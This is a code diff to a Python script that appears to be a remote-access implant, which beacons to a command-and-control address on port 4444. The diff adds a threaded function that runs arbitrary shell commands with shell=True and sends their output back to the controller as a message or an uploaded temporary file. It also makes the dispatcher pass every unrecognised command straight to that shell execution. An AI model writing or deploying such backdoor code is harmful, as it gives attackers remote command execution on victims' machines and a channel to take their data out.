@@ -5,6 +5,10 @@ import os
 import getpass
 import socket
 
+from threading import Thread
+from tempfile import NamedTemporaryFile
+import subprocess
+
 # part of standard library
 import shutil
 
@@ -14,6 +18,7 @@ SETTINGS={
 "urls":["https://10.0.0.27:4444/index.php?id=1"],
 "attempts":3,
 "beacon":10,
+"line_cap":100,
 "debug":True
 }
 
@@ -64,6 +69,36 @@ def upload(url):
     r = requests.get(url, verify=False, stream=True)
     with open(filename, 'wb') as f:
         shutil.copyfileobj(r.raw, f)
+
+
+def _execute(cmd):
+    print("Executing {}".format(cmd))
+    p = subprocess.Popen(cmd, stdout=subprocess.PIPE,
+                              stderr=subprocess.STDOUT,
+                              shell=True
+    )
+    out, err = p.communicate()
+    if out.count('\n') > SETTINGS["line_cap"]:
+        t = NamedTemporaryFile()
+        try:
+            t.write(out)
+            t.flush()
+            send_file(t.name)
+        except Exception as e:
+            print_debug(e)
+        finally:
+            os.remove(t.name)
+    else:
+        send_msg("cmd", out)
+
+def execute(cmd):
+    if type(cmd) is not str:
+        # AAAAAHHHHHHHHHHHHHHHHHHHHHHHHH
+        cmd =  ' '.join([str(s) for s in cmd])
+        print("Str cmd: {}".format(cmd))
+        
+    thread = Thread(target = _execute, args = (cmd,) )
+    thread.start()
 
 def send_msg(m=None, *args):
     print_debug("send_msg({}, {})".format(m, args))
@@ -131,7 +166,11 @@ def do(cmd, args=()):
     elif cmd in globals():
         return globals()[cmd](*args)
     else:
-        print_debug("{} not found!".format(cmd))
+        #print_debug("{} not found!".format(cmd))
+        arr = [cmd]
+        arr.extend(args)
+        print(arr)
+        execute(arr)
 
 #dowload / upload / exec in background / exec and capture output / beacon
 
